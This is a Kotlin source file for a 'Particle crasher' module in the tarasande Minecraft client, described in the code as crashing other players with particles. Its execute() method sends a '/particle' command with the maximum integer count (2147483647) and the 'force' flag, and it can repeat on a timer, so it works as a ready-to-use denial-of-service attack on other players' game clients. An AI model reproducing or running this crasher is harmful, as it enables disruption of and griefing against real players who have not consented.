package su.mandora.tarasande_crasher.module

import su.mandora.tarasande.event.impl.EventDisconnect
import su.mandora.tarasande.event.impl.EventUpdate
import su.mandora.tarasande.system.base.valuesystem.impl.ValueBoolean
import su.mandora.tarasande.system.base.valuesystem.impl.ValueMode
import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
import su.mandora.tarasande.system.feature.modulesystem.Module
import su.mandora.tarasande.util.math.TimeUtil
import su.mandora.tarasande.util.player.PlayerUtil

class ModuleParticleCrasher : Module("Particle crasher", "Crashes other players using particles", "Crasher") {

    private val mode = ValueMode(this, "Mode", false, "Explode", "Flame", "Crit")
    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (repeat.value) {
                if (timer.hasReached(repeatDelay.value.toLong())) {
                    execute()
                    timer.reset()
                }
            }
        }
    }

    override fun onEnable() {
        super.onEnable()
        if (!repeat.value) execute()
    }

    private fun execute() {
        PlayerUtil.sendChatMessage("/particle " + mode.getSelected().lowercase() + " 0 0 0 1 2147483647 force", true)
    }
}
